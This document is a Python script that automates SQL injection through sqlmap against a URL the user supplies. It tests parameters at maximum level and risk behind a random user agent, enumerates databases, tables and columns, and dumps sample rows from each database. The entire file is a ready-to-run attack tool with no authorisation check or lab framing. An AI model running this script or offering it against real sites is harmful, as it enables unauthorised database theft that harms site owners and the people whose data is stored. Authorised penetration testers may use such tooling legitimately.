#! /usr/bin/python3 
import subprocess
import re

def run_sqlmap(args):
    """Run sqlmap with given args and return stdout as string."""
    result = subprocess.run(
        ["sqlmap"] + args + ["--batch", "--random-agent"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    return result.stdout

def extract_injectable_params(output):
    """Parse sqlmap output to find injectable parameters."""
    params = set()
    for line in output.splitlines():
        match = re.search(r"Parameter: (\w+) \(\w+\)", line)
        if match:
            params.add(match.group(1))
    return list(params)

def extract_databases(output):
    """Extract database/schema names from sqlmap output."""
    dbs = []
    capture = False
    for line in output.splitlines():
        if line.strip().startswith("available databases") or line.strip().startswith("available schemas"):
            capture = True
            continue
        if capture:
            if line.strip().startswith("[*]") or line.strip() == "":
                continue
            if line.strip().startswith("[") and line.strip().endswith("]"):
                break
            dbname = line.strip().lstrip("[*]").strip()
            if dbname:
                dbs.append(dbname)
    return dbs

def extract_tables(output):
    """Extract table names from sqlmap output."""
    tables = []
    capture = False
    for line in output.splitlines():
        if line.strip().startswith("Database:"):
            capture = False
        if line.strip().startswith("Tables") or line.strip().startswith("table(s)"):
            capture = True
            continue
        if capture:
            match = re.search(r"\|\s*(\w+)\s*\|", line)
            if match:
                tables.append(match.group(1))
            elif line.strip() == "":
                break
    return tables

def extract_columns(output):
    """Extract column names from sqlmap output."""
    columns = []
    capture = False
    for line in output.splitlines():
        if line.strip().startswith("Database:"):
            capture = False
        if line.strip().startswith("Columns") or line.strip().startswith("column(s)"):
            capture = True
            continue
        if capture:
            cols = [col.strip() for col in re.findall(r"\|\s*([^|]+?)\s*\|", line)]
            columns.extend(cols)
            if line.strip() == "":
                break
    return columns

def main():
    target_url = input("Enter target URL (e.g., https://example.com/page?param=value): ").strip()

    print("\n[*] Step 1: Testing for SQL injection and identifying injectable parameters...")
    output = run_sqlmap(["-u", target_url, "--level=5", "--risk=3", "--threads=10"])
    injectable_params = extract_injectable_params(output)

    if not injectable_params:
        print("[-] No injectable parameters detected. Exiting.")
        return
    else:
        print(f"[+] Injectable parameters found: {', '.join(injectable_params)}")

    print("\n[*] Step 2: Enumerating databases/schemas...")
    output = run_sqlmap(["-u", target_url, "--dbs", "--threads=10"])
    dbs = extract_databases(output)
    if not dbs:
        print("[-] No databases/schemas found. Exiting.")
        return
    print(f"[+] Databases/Schemas found: {', '.join(dbs)}")

    for db in dbs:
        print(f"\n[*] Enumerating tables in database/schema: {db}")
        output = run_sqlmap(["-u", target_url, "-D", db, "--tables", "--threads=10"])
        tables = extract_tables(output)
        if not tables:
            print(f"[-] No tables found in {db}. Continuing with next database...")
            continue
        print(f"[+] Tables in {db}: {', '.join(tables)}")
        for table in tables[:2]:
            print(f"\n[*] Enumerating columns in table: {table}")
            output = run_sqlmap(["-u", target_url, "-D", db, "-T", table, "--columns", "--threads=10"])
            columns = extract_columns(output)
            if not columns:
                print(f"[-] No columns found in {table}. Continuing with next table...")
                continue
            print(f"[+] Columns in {table}: {', '.join(columns)}")

            print(f"\n[*] Dumping up to 10 rows from table: {table}")
            dump_output = run_sqlmap([
                "-u", target_url,
                "-D", db,
                "-T", table,
                "--dump",
                "--dump-limit=10",
                "--threads=10"
            ])
            print(dump_output)

    print("\n[+] Done. Injection verified and sample data dumped.")


main()
